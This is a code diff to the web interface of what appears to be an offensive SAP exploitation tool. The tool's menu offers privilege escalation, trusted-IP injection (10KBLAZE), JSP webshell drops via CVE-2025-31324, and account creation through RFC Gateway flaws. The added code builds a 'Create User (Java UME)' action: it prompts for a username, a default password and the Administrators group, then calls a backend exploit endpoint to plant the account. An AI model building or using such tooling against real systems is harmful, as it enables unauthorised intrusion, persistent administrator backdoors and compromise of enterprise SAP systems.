@@ -464,6 +464,7 @@ body {
       <div class="ctx-item" data-action="lpe">&#128274; Local Privilege Escalation</div>
       <div class="ctx-item" data-action="betrusted">&#128272; Betrusted — Inject Trusted IP (10KBLAZE)</div>
       <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
+      <div class="ctx-item" data-action="create_user_java">&#128100; Create User (Java UME)</div>
       <div class="ctx-item" data-action="exploit_cve_31324_drop">&#128272; Drop JSP Webshell (CVE-2025-31324)</div>
       <div class="ctx-item" data-action="create_user_gw">&#128100; Create User (GW Exploit)</div>
       <div class="ctx-item" data-action="create_user_creds">&#128100; Create User (Credentials)</div>
@@ -1716,6 +1717,7 @@ function showCtxMenu(e, sid) {
     'check_ms':              true,                    // always (probes 39NN directly)
     'check_cve_31324':       isJavaStack,             // Java-only vulnerability
     'exploit_cve_31324_drop': hasCve31324,            // need confirmed CVE-2025-31324
+    'create_user_java':      isJavaStack && (hasCve31324 || hasGwVuln), // Java + CVE or GW
     'betrusted':             hasMsPort,              // need a known MS port
     'create_user_betrusted': hasMsVuln || hasGwVuln, // need vulnerable MS or GW
     'create_user_gw':   hasGwVuln,                  // need GW vulnerability
@@ -1754,6 +1756,7 @@ function showCtxMenu(e, sid) {
     'create_user_betrusted': 'Requires a vulnerable MS (betrusted) or gateway',
     'check_cve_31324':       'Only applicable to Java / double-stack systems',
     'exploit_cve_31324_drop': 'Run Check CVE-2025-31324 first; vulnerability required',
+    'create_user_java':      'Requires Java / dual-stack system AND a usable CVE-2025-31324 or GW SAPXPG vuln',
     'create_user_gw':   'Requires a vulnerable RFC Gateway',
     'create_user_creds': 'Provide credentials first',
     'lpe':              'Provide credentials first',
@@ -1881,6 +1884,30 @@ async function ctxAction(action) {
       await api('POST', `node/${sid}/check_ms`); break;
     case 'check_cve_31324':
       await api('POST', `node/${sid}/check_cve_2025_31324`); break;
+    case 'create_user_java': {
+      const u = prompt('Create Java user\n\nUsername:', 'SAPMAP00');
+      if (!u || !u.trim()) break;
+      const p = prompt('Password (leave empty for random):', 'Andinyougo123!');
+      if (p === null) break;
+      const g = prompt('Add to group (blank = Administrators):', 'Administrators');
+      const n = (mapState.nodes || {})[sid];
+      const hasCve = n && n.cve_2025_31324_vulnerable;
+      const hasGw  = n && n.gw_vulnerable;
+      let method = 'auto';
+      if (hasCve && hasGw) {
+        const m = prompt('Method — "cve" (CVE-2025-31324, fast) or "gw" (RFC Gateway SAPXPG, slow chunked write). Leave "auto" to prefer CVE:', 'auto');
+        if (m === null) break;
+        if (/^cve/i.test(m)) method = 'cve_31324';
+        else if (/^gw/i.test(m)) method = 'gw';
+      }
+      await api('POST', `node/${sid}/create_user_java`, {
+        username: u.trim(),
+        password: (p || '').trim(),
+        group:    (g || 'Administrators').trim(),
+        method:   method,
+      });
+      break;
+    }
     case 'exploit_cve_31324_drop': {
       if (!confirm('Drop a JSP webshell via CVE-2025-31324?\n\n' +
                     'A randomly-named JSP will be written under /irj/<name>.jsp ' +
